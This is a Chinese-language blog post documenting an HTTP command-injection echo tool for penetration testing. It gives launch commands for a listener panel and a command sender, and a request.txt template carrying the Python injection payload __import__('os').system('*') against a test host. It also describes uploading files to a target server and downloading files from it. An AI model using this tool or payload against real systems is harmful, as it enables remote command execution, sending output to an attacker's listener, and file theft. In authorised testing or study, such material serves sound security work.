---
title: HTTP命令执行回显工具
categories: 开发
tags:	
  - 中间件
  - 网络安全
  - 渗透测试
description: 这是一个用于HTTP命令回显的工具。
date: 2024-07-30
---

# 1.功能简介

1. 可针对http请求的url和body中存在命令注入的地方进行注入命令，通过开启一个HTTP监听器来回显执行命令的结果。
2. 可进行文件上传和下载。
3. 可使用request请求文本的方式来传参。

-------------------------

功能演示

# 2.启动服务

## 2.1.启动面板

- 启动面板仅需要配置**端口**参数即可。

```shell
# -p', '--port', type=RestrictedInt(1, 65536), help='this is receive port; 监听器的接收端口。
Pmdt>$ python ./echopanel.py -p 8111
```

![image-20240731105216182](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731105216182.png?x-oss-process=style/img-to-webp)

## 2.2.启动命令发送端

1. listenerIP为必填参数，填写监听面板的IP地址即可
2. port，-p 监听器启动监听的端口号
3. method , -m 回显请求方法，建议默认POST即可。
4. url， -u，存在命令注入的url路径，使用"*"号标注注入点。（仅支持get方法）
5. --path, 存在命令注入的请求包路径，默认为files文件下的request.txt文件，文件中使用"*"号标注注入点。

### 2.2.1.通过request文件进行注入POST回显

1. 默认request文件路径放在项目文件的Pmdt的files目录下即可，命名为request.txt，或者直接通过--path指定request文件的路径（当未设置url参数时默认则以request文件方式发送请求）。

```shell
>$ python .\execeval.py 192.168.100.1  -p 8111
# 192.168.100.1 和 8111 为监听面板的参数
```

![image-20240731164220532](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731164220532.png?x-oss-process=style/img-to-webp)

```ini
# request.txt 
GET /?cmd=__import__("os").system("*") HTTP/1.1
Host: 192.168.100.136:8080
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8,zh-TW;q=0.7
Connection: close
```

- 存在命令注入漏洞的测试文件为test/httpweb2.py，可用于测试
- 启动测试文件

![image-20240731164735399](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731164735399.png?x-oss-process=style/img-to-webp)

## 2.3.发送命令请求演示

![image-20240731165157176](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731165157176.png?x-oss-process=style/img-to-webp)

面板回显

![image-20240731165231897](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731165231897.png?x-oss-process=style/img-to-webp)

## 2.4.文件上传演示

1. 将需要上传的文件移动到files文件夹下，例如Expx.java
2. 输入upload关键词 + 上传的文件名，+上传文件要存放到目标服务器的位置以及命名文件

![image-20240731172324071](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731172324071.png?x-oss-process=style/img-to-webp)

![image-20240731171031795](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731171031795.png?x-oss-process=style/img-to-webp)

## 2.5.文件下载测试

1. 触发关键词 download，+文件绝对路径。

![image-20240731173333472](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731173333472.png?x-oss-process=style/img-to-webp)

![image-20240731175335544](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731175335544.png?x-oss-process=style/img-to-webp)

![image-20240731175346063](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20240731175346063.png?x-oss-process=style/img-to-webp)
